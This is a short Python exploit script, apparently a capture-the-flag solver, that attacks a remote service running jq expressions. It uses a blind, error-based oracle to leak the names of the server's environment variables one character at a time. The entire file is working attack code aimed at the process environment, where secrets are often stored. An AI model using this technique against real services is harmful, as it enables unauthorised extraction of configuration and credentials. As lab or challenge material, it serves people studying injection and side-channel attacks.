import check_remote, solve_remote_live, json

chains = {int(k): v for k, v in json.loads(solve_remote_live.EMBEDDED_CHAINS_JSON).items()}

def get_char_at(key_idx, pos):
    # charset to search
    charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz0123456789{}"
    for c in charset:
        code = ord(c)
        if code not in chains:
            continue
        pred = solve_remote_live.predicate(chains[code])
        # jq expression: get the key_idx-th key, explode it, get pos-th element, then run predicate
        expr = f"env|keys|.[{key_idx}]|explode|.[{pos}]|{pred}|error"
        res = check_remote.query(expr)
        if res == "error":
            return c
    return None

print("Decoding environment keys...")
for k in range(2):
    key_name = ""
    for pos in range(30):
        c = get_char_at(k, pos)
        if c is None:
            break
        key_name += c
    print(f"Key {k}: {key_name}")
